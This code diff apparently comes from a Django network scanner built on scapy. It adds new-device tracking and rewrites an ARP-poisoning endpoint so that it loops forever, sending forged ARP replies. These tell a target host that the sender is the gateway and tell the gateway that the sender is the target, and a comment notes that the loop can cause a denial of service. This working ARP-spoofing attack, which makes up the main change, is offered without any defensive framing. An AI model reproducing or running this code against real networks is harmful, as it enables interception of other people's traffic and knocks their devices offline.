@@ -12,6 +12,7 @@ import concurrent.futures
 import json
 import os
 from itertools import repeat
+import time
 
 COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,62078,8009,9080,1080,9000,88]
 
@@ -48,7 +49,11 @@ def DeviceThreadedScanner(in_ip, defaultGateway):
         if created == False:
             # Update last seen 
             obj.last_seen = timezone.localtime(timezone.now())
-            obj.save()
+            obj.is_new = False
+        else:
+            obj.is_new = True
+
+        obj.save()
 
         # ARP SCAN
         response, unanswered = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=(ip)),timeout=1)
@@ -77,6 +82,7 @@ def DeviceScan(request):
 
     with concurrent.futures.ThreadPoolExecutor() as executor:
         executor.map(PortScanner, allDevices)
+
     return Response(status.HTTP_200_OK)
 
 
@@ -118,14 +124,21 @@ def ArpPoisioning(request):
     # pdst = destination ip
     # hwdst = destination mac
     # psrc = source ip
+    # op="who-has" makes it easier to read the ARP packet in wireshark
 
-    # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
-    adversaryARP_packet = scapy.ARP(pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
-    scapy.send(adversaryARP_packet)
+    try:
+        while True: # activate this to cause DOS on devices below
 
-    # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
-    gatewayARP_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
-    scapy.send(gatewayARP_packet)
+            # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
+            adversaryARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
+            scapy.send(adversaryARP_packet)
+
+            # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
+            gatewayARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
+            scapy.send(gatewayARP_packet)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Closing")
 
     # (Note): The ARP Packet will contain the hwsrc of the computer that the ARP packet is being sent from.
     # ARP PACKET
